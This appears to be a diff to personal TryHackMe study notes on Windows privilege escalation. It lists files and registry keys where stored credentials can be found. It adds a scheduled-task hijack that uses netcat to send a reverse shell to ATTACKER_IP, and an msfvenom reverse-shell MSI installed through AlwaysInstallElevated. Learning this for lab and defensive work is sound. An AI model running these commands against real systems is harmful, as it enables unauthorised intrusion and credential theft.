@@ -3,11 +3,11 @@ Windows Privilege Escalation (A TryHackMe Challenge: for Educational Purposes on
 via Windows Installation
 
 1. Check in the following paths and look for credentials in the <Password></Password> section
-C:\Unattend.xml
-C:\Windows\Panther\Unattend.xml
-C:\Windows\Panther\Unattend\Unattend.xml
-C:\Windows\system32\sysprep.inf
-C:\Windows\system32\sysprep\sysprep.xml
+    C:\Unattend.xml
+    C:\Windows\Panther\Unattend.xml
+    C:\Windows\Panther\Unattend\Unattend.xml
+    C:\Windows\system32\sysprep.inf
+    C:\Windows\system32\sysprep\sysprep.xml
 
 
 via Powershell History
@@ -22,9 +22,28 @@ via Saved Windows Credentials
 via IIS conf
 
 1. Check the following paths (usually found in database connection strings)
-C:\inetpub\wwwroot\web.config
-C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
+    C:\inetpub\wwwroot\web.config
+    C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
 
 via Putty
 
 1. reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s (if users store their sessions there)
+
+via Scheduled Tasks
+
+1. schtasks /query /tn vulntask /fo list /v to list existing scheduled tasks
+2. icacls c:\tasks\<script_name> to check file permissions
+3. If file is editable, C:\> echo c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4444 > C:\tasks\<script_name>
+4. Start listner on attacker's machine nc -nlvp 4444
+5. Run the task on the target machine C:\> schtasks /run /tn vulntask 
+
+via AlwaysInstallElevated
+
+1. query these
+    C:\> reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
+    C:\> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
+2. (Attacker machine) msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_MACHINE_IP LPORT=LOCAL_PORT -f msi -o malicious.msi
+3. (Target machine) C:\> msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi
+
+
+
